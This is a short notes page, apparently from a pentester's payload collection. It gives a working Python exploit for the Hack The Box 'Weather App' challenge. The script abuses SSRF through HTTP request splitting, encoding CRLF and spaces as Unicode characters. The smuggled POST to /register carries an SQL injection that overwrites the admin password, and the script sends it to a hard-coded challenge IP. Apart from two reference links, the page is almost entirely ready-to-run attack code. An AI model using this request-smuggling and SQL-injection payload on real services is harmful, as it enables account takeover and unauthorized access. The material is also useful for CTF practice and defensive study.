---
layout: default
title: SSRF via Request Splitting
nav_order: 1
parent: Payloads
---

# SSRF via Request Splitting
{: .no_toc }

---

Need to read:
- <https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/>
- <https://blog.d3s34.me/weather-app>

Example: HTB - Weather App

Payload

```python
import requests

CRLF = "\u010D\u010A"
SPACE = "\u0120"

SQLi = f"username=admin&password=1') on conflict(username) do update set password='123';-- -"\
    .replace(" ", SPACE)\
    .replace("'", "%27")

payload =   f"{SPACE}HTTP/1.1{CRLF}"\
            f"Host:{SPACE}127.0.0.1{CRLF}"\
            f"{CRLF}"\
            \
            f"POST{SPACE}/register{SPACE}HTTP/1.1{CRLF}"\
            f"Host:{SPACE}127.0.0.1{CRLF}"\
            f"Content-Length:{SPACE}{len(SQLi)}{CRLF}"\
            f"Content-Type:{SPACE}application/x-www-form-urlencoded{CRLF}"\
            f"{CRLF}"\
            f"{SQLi}{CRLF}"\
            f"{CRLF}" \
            \
            f"GET{SPACE}/"

url = 'http://68.183.36.105:31623/api/weather'
data = {"endpoint":"127.0.0.1",
        "city":"Hanoi" + payload,
        "country":"VN"}

x = requests.post(url, data = data)

print(x.text)
```
